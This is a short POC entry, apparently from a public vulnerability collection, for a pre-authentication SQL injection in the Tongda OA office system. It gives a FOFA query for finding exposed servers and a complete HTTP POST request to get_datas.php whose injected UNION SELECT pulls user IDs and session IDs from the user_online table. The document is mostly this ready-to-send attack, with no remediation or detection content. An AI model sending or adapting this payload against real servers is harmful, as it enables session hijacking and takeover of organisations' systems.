## 通达OA get_datas.php前台sql注入

##  fofa
```
app="TDXK-通达OA"
```

## POC
```
POST /general/reportshop/utils/get_datas.php HTTP/1.1
Host: {{HostName}}
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Length: 2

USER_ID=OfficeTask&PASSWORD=&col=1,1&tab=5 where 1={`\='` 1} union (select uid,sid from user_online where 1\={`=` 1})-- '1**
```
![image](https://github.com/wy876/POC/assets/139549762/55ba1ee3-215b-4fd2-8c0c-0694a20f6bfd)

![image](https://github.com/wy876/POC/assets/139549762/3d0399a3-9fe9-46d9-b725-12acb84d422c)


## 漏洞来源
```
https://forum.butian.net/share/278
```
